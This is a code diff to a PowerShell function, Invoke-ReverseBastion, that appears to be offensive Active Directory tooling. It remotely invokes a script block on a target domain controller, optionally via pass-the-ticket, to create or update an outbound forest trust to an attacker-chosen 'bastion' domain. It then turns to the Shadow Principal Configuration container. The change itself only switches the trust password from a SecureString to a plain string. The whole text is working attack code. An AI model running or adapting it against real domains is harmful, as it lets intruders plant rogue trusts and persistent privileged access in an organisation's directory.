@@ -82,7 +82,7 @@ function Invoke-ReverseBastion {
     $block = {
         param(
             [string]$BastionDomain,
-            [System.Security.SecureString]$trustpass
+            [string]$TrustPassword
         )
         [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.ActiveDirectory")
 
@@ -90,14 +90,14 @@ function Invoke-ReverseBastion {
             [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().CreateLocalSideOfTrustRelationship(
                 $BastionDomain,
                 [System.DirectoryServices.ActiveDirectory.TrustDirection]::Outbound,
-                $trustpass
+                $TrustPassword
             )
         } catch [System.DirectoryServices.ActiveDirectory.ActiveDirectoryObjectExistsException] {
             Write-Host "Local side of trust relationship already exists; updating instead of creating anew"
             [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().UpdateLocalSideOfTrustRelationship(
                 $BastionDomain,
                 [System.DirectoryServices.ActiveDirectory.TrustDirection]::Outbound,
-                $trustpass
+                $TrustPassword
             )
         }
 
@@ -132,9 +132,9 @@ function Invoke-ReverseBastion {
     }
 
     if ($PTT) {
-        Invoke-Command -ComputerName $TargetDC -ScriptBlock $block -ArgumentList "-BastionDomain $CurrentDomain -trustpass $trustpass"
+        Invoke-Command -ComputerName $TargetDC -ScriptBlock $block -ArgumentList "-BastionDomain $CurrentDomain -TrustPassword $trustpass"
     } else {
-        Invoke-Command -ComputerName $TargetDC -Credential $Credential -ScriptBlock $block -ArgumentList "-BastionDomain $CurrentDomain -trustpass $trustpass"
+        Invoke-Command -ComputerName $TargetDC -Credential $Credential -ScriptBlock $block -ArgumentList "-BastionDomain $CurrentDomain -TrustPassword $trustpass"
     }
 
     $shadowcontainer = "CN=Shadow Principal Configuration,CN=Services,$((Get-ADRootDSE).ConfigurationNamingContext)"
